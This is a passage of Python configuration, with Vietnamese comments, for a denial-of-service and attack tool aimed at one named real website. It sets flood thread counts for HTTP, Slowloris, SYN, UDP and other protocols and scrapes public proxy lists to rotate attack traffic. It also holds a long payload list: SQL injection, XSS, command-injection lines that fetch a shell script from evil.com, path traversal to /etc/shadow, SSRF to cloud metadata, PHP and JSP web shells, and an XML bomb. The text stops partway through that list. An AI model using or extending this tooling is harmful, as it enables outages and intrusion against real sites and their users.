# ============================================
# CẤU HÌNH CHUNG - NÂNG CẤP TỐI ĐA
# ============================================
TARGET_HOST = "www.t4xcheatgamer.x10.mx"
TARGET_IP = None  # Sẽ tự động phân giải
TARGET_PORT = 443
TARGET_HTTP_PORT = 80
TARGET_HTTPS_PORT = 443
TARGET_FTP_PORT = 21
TARGET_SSH_PORT = 22
TARGET_SMTP_PORT = 25
TARGET_DNS_PORT = 53
TARGET_MYSQL_PORT = 3306
TARGET_RDP_PORT = 3389
TARGET_RTSP_PORT = 554
TARGET_SIP_PORT = 5060

# ĐA MỤC TIÊU MỞ RỘNG
TARGET_URLS = [
    "https://www.t4xcheatgamer.x10.mx/dll_download.php",
    "https://www.t4xcheatgamer.x10.mx/login.php",
    "https://www.t4xcheatgamer.x10.mx/dll_status.php",
    "https://www.t4xcheatgamer.x10.mx/register.php",
    "https://www.t4xcheatgamer.x10.mx/admin/",
    "https://www.t4xcheatgamer.x10.mx/api/v1/",
    "https://www.t4xcheatgamer.x10.mx/upload/",
    "https://www.t4xcheatgamer.x10.mx/forum/",
    "https://www.t4xcheatgamer.x10.mx/support/",
    "https://www.t4xcheatgamer.x10.mx/contact.php",
]

TARGET_PATHS = [
    "/dll_download.php",
    "/login.php",
    "/dll_status.php",
    "/index.php",
    "/download.php",
    "/files/",
    "/wp-admin/",
    "/admin/",
    "/wp-login.php",
    "/api/",
    "/upload.php",
    "/config.php",
    "/backup/",
    "/wp-content/",
    "/wp-includes/",
    "/xmlrpc.php",
    "/wp-json/",
    "/.env",
    "/.git/config",
    "/phpinfo.php",
    "/info.php",
    "/test.php",
    "/status.php",
    "/server-status",
    "/server-info",
    "/.htaccess",
    "/robots.txt",
    "/sitemap.xml",
    "/crossdomain.xml",
    "/clientaccesspolicy.xml",
    "/.well-known/",
    "/cgi-bin/",
    "/console/",
    "/manager/",
    "/jmx-console/",
    "/web-console/",
    "/invoker/",
    "/juddi/",
    "/webdav/",
    "/axis2/",
    "/druid/",
    "/solr/",
    "/struts/",
    "/tapestry/",
    "/wicket/",
    "/vaadin/",
    "/grails/",
    "/play/",
    "/rails/",
    "/django/",
    "/laravel/",
    "/symfony/",
    "/zend/",
    "/codeigniter/",
    "/yii/",
    "/cakephp/",
    "/flask/",
    "/express/",
    "/spring/",
    "/hibernate/",
    "/myfaces/",
    "/richfaces/",
    "/primefaces/",
    "/icefaces/",
    "/mojarra/",
    "/myfaces/",
    "/openam/",
    "/openidm/",
    "/openig/",
    "/opendj/",
    "/forgerock/",
    "/pingfederate/",
    "/siteminder/",
    "/shibboleth/",
    "/cas/",
    "/oauth/",
    "/openid/",
    "/saml/",
    "/wsfed/",
    "/kerberos/",
    "/ldap/",
    "/adfs/",
    "/azure/",
    "/aws/",
    "/gcp/",
    "/cloud/",
    "/cdn/",
    "/waf/",
    "/firewall/",
    "/ids/",
    "/ips/",
    "/siem/",
    "/soar/",
    "/xsoar/",
    "/phantom/",
    "/demisto/",
    "/splunk/",
    "/elk/",
    "/graylog/",
    "/logstash/",
    "/kibana/",
    "/grafana/",
    "/prometheus/",
    "/alertmanager/",
    "/pagerduty/",
    "/opsgenie/",
    "/victorops/",
    "/xray/",
    "/burp/",
    "/zap/",
    "/nessus/",
    "/openvas/",
    "/qualys/",
    "/rapid7/",
    "/tenable/",
    "/crowdstrike/",
    "/carbonblack/",
    "/sentinelone/",
    "/cylance/",
    "/mcafee/",
    "/symantec/",
    "/trendmicro/",
    "/kaspersky/",
    "/bitdefender/",
    "/eset/",
    "/sophos/",
    "/fortinet/",
    "/paloalto/",
    "/checkpoint/",
    "/cisco/",
    "/juniper/",
    "/f5/",
    "/citrix/",
    "/vmware/",
    "/hyperv/",
    "/xen/",
    "/kvm/",
    "/docker/",
    "/kubernetes/",
    "/openshift/",
    "/rancher/",
    "/mesos/",
    "/swarm/",
    "/nomad/",
    "/consul/",
    "/vault/",
    "/terraform/",
    "/ansible/",
    "/puppet/",
    "/chef/",
    "/salt/",
    "/cfengine/",
    "/rundeck/",
    "/jenkins/",
    "/teamcity/",
    "/bamboo/",
    "/gitlab/",
    "/github/",
    "/bitbucket/",
    "/azuredevops/",
    "/jira/",
    "/confluence/",
    "/servicenow/",
    "/salesforce/",
    "/sap/",
    "/oracle/",
    "/microsoft/",
    "/google/",
    "/amazon/",
    "/facebook/",
    "/twitter/",
    "/linkedin/",
    "/instagram/",
    "/youtube/",
    "/whatsapp/",
    "/telegram/",
    "/signal/",
    "/wechat/",
    "/tiktok/",
    "/snapchat/",
    "/reddit/",
    "/pinterest/",
    "/tumblr/",
    "/flickr/",
    "/vimeo/",
    "/dailymotion/",
    "/twitch/",
    "/discord/",
    "/slack/",
    "/teams/",
    "/zoom/",
    "/webex/",
    "/skype/",
    "/gotomeeting/",
    "/bluejeans/",
    "/ringcentral/",
    "/8x8/",
    "/vonage/",
    "/twilio/",
    "/plivo/",
    "/nexmo/",
    "/messagebird/",
    "/sinch/",
    "/bandwidth/",
    "/telnyx/",
    "/flowroute/",
    "/voipms/",
    "/callcentric/",
    "/voipbuster/",
    "/fring/",
    "/viber/",
    "/line/",
    "/kakaotalk/",
    "/zalo/",
    "/hike/",
    "/imo/",
    "/bip/",
    "/threema/",
    "/wire/",
    "/keybase/",
    "/tox/",
    "/ricochet/",
    "/jami/",
    "/matrix/",
    "/element/",
    "/rocketchat/",
    "/mattermost/",
    "/zulip/",
    "/flock/",
    "/ryver/",
    "/typetalk/",
    "/chatwork/",
    "/lineworks/",
    "/talkn/",
    "/hivy/",
    "/fleep/",
    "/glip/",
    "/troopmessenger/",
    "/semaphor/",
    "/spike/",
    "/coyim/",
    "/surespot/",
    "/wickr/",
    "/dust/",
    "/coverme/",
    "/telegram/",
    "/signal/",
    "/status/",
    "/obsidian/",
    "/notion/",
    "/roam/",
    "/logseq/",
    "/athens/",
    "/foam/",
    "/dendron/",
    "/orgmode/",
    "/vimwiki/",
    "/emacs/",
    "/vscode/",
    "/atom/",
    "/sublime/",
    "/intellij/",
    "/eclipse/",
    "/netbeans/",
    "/androidstudio/",
    "/xcode/",
    "/visualstudio/",
    "/rider/",
    "/goland/",
    "/phpstorm/",
    "/webstorm/",
    "/pycharm/",
    "/datagrip/",
    "/clion/",
    "/rubymine/",
    "/appcode/",
    "/dataspell/",
    "/fleet/",
    "/cursor/",
    "/windsurf/",
    "/cline/",
    "/continue/",
    "/tabnine/",
    "/kite/",
    "/codota/",
    "/aixcoder/",
    "/deepcode/",
    "/snyk/",
    "/veracode/",
    "/checkmarx/",
    "/fortify/",
    "/appscan/",
    "/webinspect/",
    "/acunetix/",
    "/netsparker/",
    "/invicti/",
    "/detectify/",
    "/intruder/",
    "/shodan/",
    "/censys/",
    "/zoomeye/",
    "/fofa/",
    "/binaryedge/",
    "/onyphe/",
    "/leakix/",
    "/fullhunt/",
    "/securitytrails/",
    "/dnsdumpster/",
    "/virustotal/",
    "/abuseipdb/",
    "/alienvault/",
    "/threatcrowd/",
    "/hybrid-analysis/",
    "/anyrun/",
    "/joesandbox/",
    "/capesandbox/",
    "/malshare/",
    "/malwarebazaar/",
    "/urlhaus/",
    "/phishtank/",
    "/openphish/",
    "/phishstats/",
    "/apwg/",
]

# File lưu proxy
PROXY_FILE = "proxies_raw.txt"
PROXY_LIVE_FILE = "proxies_live.txt"
PROXY_SOCKS4_FILE = "proxies_socks4.txt"
PROXY_SOCKS5_FILE = "proxies_socks5.txt"
PROXY_HTTP_FILE = "proxies_http.txt"
PROXY_HTTPS_FILE = "proxies_https.txt"

# Biến toàn cục để xử lý Ctrl+C
current_proxy_manager = None

# Tham số scan proxy - NÂNG CẤP
PROXY_SOURCES = [
    # API nguồn proxy
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all",
    # GitHub raw proxies
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/socks4.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/socks5.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw-socks4.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw-socks5.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
    "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt",
    "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/https.txt",
    "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks4.txt",
    "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks5.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/https.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks4.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks5.txt",
    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies_anonymous/http.txt",
    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies_anonymous/socks4.txt",
    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies_anonymous/socks5.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
    "https://raw.githubusercontent.com/Volodichev/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/Volodichev/proxy-list/main/socks4.txt",
    "https://raw.githubusercontent.com/Volodichev/proxy-list/main/socks5.txt",
    # Web sources
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://www.proxy-list.download/api/v1/get?type=https",
    "https://www.proxy-list.download/api/v1/get?type=socks4",
    "https://www.proxy-list.download/api/v1/get?type=socks5",
    "https://spys.me/proxy.txt",
    "https://free-proxy-list.net/",
    "https://www.sslproxies.org/",
    "https://www.us-proxy.org/",
    "https://www.socks-proxy.net/",
    "https://www.proxyscan.io/download?type=http",
    "https://www.proxyscan.io/download?type=https",
    "https://www.proxyscan.io/download?type=socks4",
    "https://www.proxyscan.io/download?type=socks5",
    "https://openproxy.space/list/http",
    "https://openproxy.space/list/https",
    "https://openproxy.space/list/socks4",
    "https://openproxy.space/list/socks5",
    "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc&protocols=http",
    "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc&protocols=https",
    "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc&protocols=socks4",
    "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc&protocols=socks5",
    "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt",
    "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks4.txt",
    "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks5.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/https/https.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/socks4/socks4.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/socks5/socks5.txt",
    "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/http.txt",
    "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/https.txt",
    "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/ObcbO/getproxy/master/http.txt",
    "https://raw.githubusercontent.com/ObcbO/getproxy/master/socks4.txt",
    "https://raw.githubusercontent.com/ObcbO/getproxy/master/socks5.txt",
    "https://raw.githubusercontent.com/yemixzy/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/yemixzy/proxy-list/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/yemixzy/proxy-list/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/faradaytrs/proxy-scraper/main/proxies.txt",
    "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
    "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/socks4.txt",
    "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/socks5.txt",
    "https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt",
    "https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/socks4.txt",
    "https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/socks5.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
    "https://raw.githubusercontent.com/saisuiu/Lionkings-Http-Proxys-Proxies/main/cnfree.txt",
    "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt",
    "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt",
    "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
    "https://raw.githubusercontent.com/elliottophellia/yakumo/master/results/http/global.txt",
    "https://raw.githubusercontent.com/elliottophellia/yakumo/master/results/socks4/global.txt",
    "https://raw.githubusercontent.com/elliottophellia/yakumo/master/results/socks5/global.txt",
]

PROXY_CHECK_TIMEOUT = 2  # Giảm timeout để kiểm tra nhanh hơn
PROXY_CHECK_THREADS = 500  # Tăng số luồng kiểm tra
MAX_RETRIES = 0  # Không retry để tăng tốc
SAVE_INTERVAL = 1000

TEST_URLS = [
    "http://httpbin.org/ip",
    "https://api.ipify.org?format=json",
    "http://ip-api.com/json/",
    "https://httpbin.org/get",
    "https://api.myip.com",
    "http://checkip.amazonaws.com",
    "https://ifconfig.me/ip",
    "http://icanhazip.com",
]

# Tham số DDoS - SIÊU TỐI ĐA
HTTP_FLOOD_THREADS = 5000
SLOWLORIS_THREADS = 2000
POST_FLOOD_THREADS = 2000
RANDOM_METHOD_THREADS = 5000
SYN_FLOOD_THREADS = 1000
UDP_FLOOD_THREADS = 1000
ICMP_FLOOD_THREADS = 500
DNS_FLOOD_THREADS = 1000
FTP_FLOOD_THREADS = 500
SSH_FLOOD_THREADS = 500
SMTP_FLOOD_THREADS = 500
WEBSOCKET_FLOOD_THREADS = 1000
HTTP2_FLOOD_THREADS = 1000
HTTP3_FLOOD_THREADS = 500
GRPC_FLOOD_THREADS = 500
GRAPHQL_FLOOD_THREADS = 1000
REST_FLOOD_THREADS = 1000
SOAP_FLOOD_THREADS = 500
XMLRPC_FLOOD_THREADS = 1000
JSONRPC_FLOOD_THREADS = 1000
DDOS_DELAY = 0
ROTATE_PROXY_EVERY = 1

# ============================================
# PHÂN GIẢI DNS TỰ ĐỘNG
# ============================================
def resolve_target_ip():
    """Phân giải IP của mục tiêu"""
    global TARGET_IP
    try:
        TARGET_IP = socket.gethostbyname(TARGET_HOST)
        print(f"[+] Đã phân giải {TARGET_HOST} -> {TARGET_IP}")
        return TARGET_IP
    except:
        print(f"[-] Không thể phân giải {TARGET_HOST}")
        return None

# ============================================
# HÀNG TRĂM HTTP METHODS
# ============================================
HTTP_METHODS = [
    "GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS", "PATCH", "TRACE", "CONNECT",
    "PURGE", "DEBUG", "TRACK", "LOCK", "UNLOCK", "PROPFIND", "PROPPATCH", "MKCOL",
    "COPY", "MOVE", "SEARCH", "BIND", "UNBIND", "REBIND", "LABEL", "LINK", "UNLINK",
    "MERGE", "BASELINE", "CHECKIN", "CHECKOUT", "UNCHECKOUT", "VERSION-CONTROL",
    "REPORT", "UPDATE", "REDIRECT", "FOOBAR", "RANDOM123", "NULL", "FAKE",
    # HTTP/1.1 extension methods
    "MKCALENDAR", "ACL", "RSET", "NOOP", "EXPIRE", "TTL", "X-Forwarded-For",
    "X-Real-IP", "X-Client-IP", "X-Originating-IP", "X-Remote-IP", "X-Remote-Addr",
    "X-Forwarded-Host", "X-Forwarded-Proto", "X-Host", "X-Forwarded-Server",
    # Custom methods for WAF bypass
    "GETS", "POSTS", "PUTS", "DELETES", "PATCHES", "OPTIONSES",
    "get", "post", "put", "delete", "patch", "options",
    "GET ", "POST ", "PUT ", "DELETE ", "PATCH ",
    "GET\t", "POST\t", "PUT\t", "DELETE\t", "PATCH\t",
    # HTTP/0.9 methods
    "GET / HTTP/0.9",
    "POST / HTTP/0.9",
    # WebDAV extended
    "ORDERPATCH", "PATCHSET", "PATCHGET", "PATCHDELETE",
    "PATCHPUT", "PATCHPOST", "PATCHHEAD", "PATCHOPTIONS",
    # Random method strings
    "".join(random.choices(string.ascii_uppercase, k=random.randint(3, 10))) for _ in range(50)
]

# Hàng trăm Content-Type khác nhau
CONTENT_TYPES = [
    "application/x-www-form-urlencoded",
    "multipart/form-data",
    "application/json",
    "application/xml",
    "text/xml",
    "text/plain",
    "text/html",
    "application/octet-stream",
    "application/x-httpd-php",
    "application/pdf",
    "image/jpeg",
    "image/png",
    "image/gif",
    "video/mp4",
    "audio/mpeg",
    "application/zip",
    "application/gzip",
    "application/x-tar",
    "application/x-7z-compressed",
    "application/x-rar-compressed",
    "application/x-shockwave-flash",
    "application/vnd.ms-excel",
    "application/vnd.ms-powerpoint",
    "application/msword",
    "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
    "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
    "application/java-archive",
    "application/x-msdownload",
    "application/x-python-code",
    "application/x-perl",
    "application/x-ruby",
    "application/x-php",
    "application/x-javascript",
    "text/css",
    "text/csv",
    "application/x-yaml",
    "application/x-www-form-urlencoded; charset=UTF-8",
    "multipart/form-data; boundary=----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16)),
    "application/json; charset=UTF-8",
    "application/xml; charset=UTF-8",
    # GraphQL
    "application/graphql",
    "application/graphql+json",
    # gRPC
    "application/grpc",
    "application/grpc+proto",
    "application/grpc+json",
    # Protocol Buffers
    "application/protobuf",
    "application/x-protobuf",
    # MessagePack
    "application/msgpack",
    "application/x-msgpack",
    # BSON
    "application/bson",
    # CBOR
    "application/cbor",
    # Avro
    "avro/binary",
    "application/avro",
    # Thrift
    "application/x-thrift",
    # Custom
    "text/x-json",
    "text/x-js",
    "text/javascript",
    "application/javascript",
    "application/x-javascript",
    "text/ecmascript",
    "application/ecmascript",
    "text/vbscript",
    "text/vbs",
    "application/x-sh",
    "application/x-csh",
    "text/x-script.sh",
    "text/x-script.csh",
    "text/x-script.ksh",
    "text/x-script.tcsh",
    "text/x-script.zsh",
    "text/x-script.bash",
]

# Hàng trăm query string parameters
QUERY_PARAMS_POOL = [
    "download", "file_id", "id", "action", "mode", "type", "token", "key", "hash",
    "checksum", "version", "user", "pass", "username", "password", "login", "email",
    "admin", "root", "debug", "test", "page", "sort", "order", "limit", "offset",
    "search", "q", "query", "cmd", "exec", "command", "shell", "eval", "include",
    "require", "file", "path", "dir", "folder", "url", "redirect", "return", "next",
    "callback", "jsonp", "format", "output", "api_key", "apikey", "auth", "session",
    "cookie", "csrf", "nonce", "timestamp", "time", "date", "rand", "random",
    "s", "p", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
    "n", "o", "r", "t", "u", "v", "w", "x", "y", "z",
    # Web parameters
    "action", "admin", "ajax", "api", "app", "archive", "article", "asset",
    "attachment", "author", "base", "blog", "browse", "cache", "cart", "cat",
    "category", "channel", "checkout", "client", "collection", "comment", "comments",
    "config", "configuration", "content", "control", "controller", "cron",
    "dashboard", "data", "db", "default", "delete", "demo", "detail", "details",
    "dev", "dir", "directory", "doc", "docs", "document", "documentation",
    "domain", "downloads", "edit", "entry", "error", "event", "example", "export",
    "extension", "faq", "feature", "feed", "feedback", "filemanager", "files",
    "filter", "form", "forum", "function", "gallery", "gateway", "group", "guest",
    "guide", "help", "home", "image", "images", "import", "index", "info",
    "install", "installer", "item", "items", "job", "jobs", "join", "js",
    "language", "layout", "library", "license", "link", "links", "list", "listing",
    "load", "local", "locale", "location", "log", "login", "logout", "logs",
    "mail", "main", "manage", "management", "manager", "manual", "map", "maps",
    "media", "member", "members", "menu", "message", "messages", "meta", "method",
    "misc", "module", "modules", "movie", "movies", "music", "myaccount", "name",
    "nav", "navigation", "network", "new", "news", "newsletter", "node", "note",
    "notes", "notice", "notification", "oauth", "object", "offer", "offline",
    "online", "option", "options", "order", "pageid", "pages", "panel", "payment",
    "photo", "photos", "picture", "pictures", "ping", "plugin", "plugins", "policy",
    "poll", "polls", "popular", "portal", "post", "posts", "preview", "price",
    "pricing", "privacy", "private", "product", "products", "profile", "project",
    "projects", "promo", "public", "publish", "rating", "recent", "record",
    "records", "ref", "reference", "referral", "referrer", "register", "registration",
    "release", "remote", "remove", "reply", "report", "request", "reset",
    "resource", "resources", "response", "result", "results", "review", "reviews",
    "role", "roles", "room", "rooms", "root", "route", "router", "rss", "rule",
    "rules", "run", "runtime", "sample", "save", "schedule", "schema", "script",
    "scripts", "section", "security", "select", "server", "service", "services",
    "session", "setting", "settings", "setup", "share", "shop", "show", "signin",
    "signup", "site", "sitemap", "skin", "source", "spec", "sql", "src", "start",
    "state", "static", "stats", "status", "store", "style", "stylesheet",
    "submit", "subscribe", "subscription", "support", "sync", "system", "table",
    "tables", "tab", "tabs", "tag", "tags", "task", "tasks", "template",
    "templates", "term", "terms", "test", "tests", "text", "theme", "themes",
    "thread", "threads", "thumb", "thumbnail", "timeline", "title", "token",
    "tool", "tools", "top", "topic", "topics", "track", "tracking", "traffic",
    "trail", "transaction", "transfer", "translate", "trial", "tutorial",
    "tutorials", "type", "ui", "unlock", "update", "upgrade", "upload", "uri",
    "url", "userid", "users", "utility", "valid", "validate", "validation",
    "value", "values", "var", "vars", "vendor", "version", "video", "videos",
    "view", "views", "visitor", "vote", "vulnerability", "warehouse", "web",
    "webhook", "widget", "widgets", "wiki", "window", "word", "work", "workflow",
    "workspace", "world", "xml", "yaml", "yml", "zone",
]

# Hàng trăm giá trị payload
PAYLOADS = [
    # SQL Injection payloads
    "' OR '1'='1", "' OR 1=1--", "admin'--", "1' OR '1'='1'--",
    "1; DROP TABLE users--", "' UNION SELECT * FROM users--",
    "1 AND 1=1", "1 AND 1=2", "' OR 'x'='x",
    "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
    "1' ORDER BY 4--", "1' ORDER BY 5--", "1' ORDER BY 10--",
    "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--",
    "1' UNION SELECT NULL,NULL,NULL--", "1' UNION SELECT NULL,NULL,NULL,NULL--",
    "1' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "1' AND '1'='1'--", "1' AND '1'='2'--",
    "1' AND SLEEP(5)--", "1' AND SLEEP(10)--",
    "1' AND BENCHMARK(1000000,MD5('A'))--",
    "' UNION SELECT table_name FROM information_schema.tables--",
    "' UNION SELECT column_name FROM information_schema.columns--",
    # XSS payloads
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "javascript:alert(1)", "<svg/onload=alert(1)>",
    "<body onload=alert(1)>", "<input onfocus=alert(1) autofocus>",
    "<select onfocus=alert(1) autofocus>", "<textarea onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>", "<keygen onfocus=alert(1) autofocus>",
    "<video><source onerror=alert(1)>", "<audio src=x onerror=alert(1)>",
    "<iframe src=javascript:alert(1)>", "<embed src=javascript:alert(1)>",
    "<object data=javascript:alert(1)>", "<math><a xlink:href=javascript:alert(1)>click</a></math>",
    # Command injection
    "; ls -la", "| cat /etc/passwd", "`id`", "$(whoami)",
    ";wget http://evil.com/shell.sh", ";curl http://evil.com/shell.sh",
    "| wget http://evil.com/shell.sh", "| curl http://evil.com/shell.sh",
    # Path traversal
    "../../../etc/passwd", "..\\..\\..\\windows\\system32",
    "../../etc/shadow", "../../etc/hosts", "../../etc/hostname",
    "../../etc/issue", "../../etc/motd", "../../etc/resolv.conf",
    "../../proc/self/environ", "../../proc/self/cmdline",
    "../../proc/self/status", "../../proc/self/maps",
    # Random strings
    ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(50, 500))),
    ''.join(random.choices(string.printable, k=random.randint(100, 1000))),
    # Null bytes
    "\x00" * random.randint(100, 1000),
    # XML bomb
    '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">]><lolz>&lol2;</lolz>',
    # JSON injection
    '{"__proto__": {"admin": true}}',
    '{"constructor": {"prototype": {"admin": true}}}',
    '{"$where": "1==1"}',
    '{"$regex": ".*"}',
    '{"$gt": ""}',
    '{"$ne": null}',
    # NoSQL injection
    '{"$gt": ""}', '{"$ne": null}', '{"$regex": ".*"}',
    '{"$where": "sleep(5000)"}',
    # XXE
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
    # SSTI
    '{{7*7}}', '${7*7}', '<%= 7*7 %>', '#{7*7}',
    '{{config}}', '{{self}}', '{{request}}', '{{session}}',
    '{{"".__class__.__mro__[1].__subclasses__()}}',
    # LDAP injection
    '*)(uid=*))(|(uid=*',
    '*)(&(uid=*))(|(uid=*',
    '*))%00',
    # XML injection
    '<foo>bar</foo>', '<foo attr="bar"/>',
    '<![CDATA[<script>alert(1)</script>]]>',
    # CRLF injection
    '%0d%0aSet-Cookie:crlf=true',
    '%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0aContent-Length:19%0d%0a<html>crlf</html>',
    # SSRF payloads
    'http://169.254.169.254/latest/meta-data/',
    'http://localhost:8080/admin',
    'http://127.0.0.1:6379/',
    'http://[::1]:6379/',
    'http://0:6379/',
    'http://0.0.0.0:6379/',
    'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a',
    # File upload payloads
    '<?php system($_GET["cmd"]); ?>',
    '<?php eval($_POST["code"]); ?>',
    '<?php echo shell_exec($_GET["cmd"]); ?>',
    '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
    '<% out.println("Hello World!"); %>',
    # Open redirect
    '//evil.com', '//google.com%2F@evil.com',
    'https://evil.com', 'https://google.com%23@evil.com',
    'https://google.com%2F%2Fevil.com',
    # HTTP parameter pollution
    'param1=val1&param2=val2&param1=val3',
    'param[]=val1&param[]=val2&param[]=val3',
    # Massive payload
    'A' * 100000,
    'B' * 1000000,
    # Unicode bypass
    'admin%c0%af', '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd',
    # Large number
    str(random.randint(999999999, 999999999999)),
    str(random.randint(1000000000000, 9999999999999)),
    # Negative number
    str(random.randint(-999999999, -1)),
    # Float
    str(random.uniform(-999999.999, 999999.999)),
